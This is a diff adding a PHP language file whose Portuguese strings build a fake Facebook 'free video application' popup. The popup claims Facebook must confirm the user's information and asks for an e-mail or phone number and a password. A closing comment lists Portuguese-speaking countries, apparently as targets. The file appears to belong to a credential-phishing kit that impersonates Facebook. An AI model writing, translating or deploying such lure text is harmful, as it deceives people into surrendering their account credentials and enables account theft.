@@ -1,0 +1,29 @@
+<?php
+/*
+-----------------
+Idioma: Espanol
+-----------------
+*/
+ 
+$lang = array();
+ 
+// General
+
+$lang['LANG'] = 'pt';
+ 
+// Fondo
+
+$lang['TITULO_PAGINA'] = 'Aplicação Facebook';
+ 
+// Pop-UP
+ 
+$lang['POPUP_TITULO'] = 'Facebook aplicação de vídeo (Free)';
+$lang['POPUP_DESCRIPCION'] = 'Facebook tem de confirmar a seguinte informação para permitir o acesso a esta aplicação vídeos, faça o login!';
+$lang['POPUP_CORREO'] = 'E-mail ou telefone';
+$lang['POPUP_CONTRASENA'] = 'Senha';
+$lang['POPUP_SUBMIT'] = 'Entrar';
+$lang['POPUP_CANDADO'] = 'Esta aplicação não está autorizado a publicar no Facebook.';
+
+/*
+array("Brazil", "Mozambique", "Angola", "Portugal", "Guinea-Bissau", "Timor-leste", "Macau", "Cape Verde", "Sao Tome and Principe")
+*/
